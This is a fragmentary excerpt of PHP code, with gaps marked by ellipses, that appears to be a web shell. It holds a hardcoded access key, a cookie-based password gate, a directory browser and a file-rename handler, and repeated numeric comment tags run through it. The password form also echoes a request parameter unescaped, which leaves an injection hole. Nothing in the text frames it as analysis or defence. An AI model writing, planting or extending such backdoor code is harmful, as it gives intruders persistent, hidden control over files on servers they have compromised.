...
$auth_key = "cfbb21659a906e0a9c40a3531e1a807f";
...
$pass = false;
if (isset($_COOKIE['pw_name_13597'])) {
    if(($_COOKIE['pw_name_13597']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_13597'])) {
        if(($_POST['pw_name_13597']) == $auth_key) {
            setcookie("pw_name_13597", $_POST['pw_name_13597']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_13597' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1723903176970155 1723903176775055 1723903176328081 1723903176764737
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1723903176970155 1723903176775055 1723903176328081 1723903176764737
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1723903176970155 1723903176775055 1723903176328081 1723903176764737
            $name = PATH . "/" . $_GET['r'];
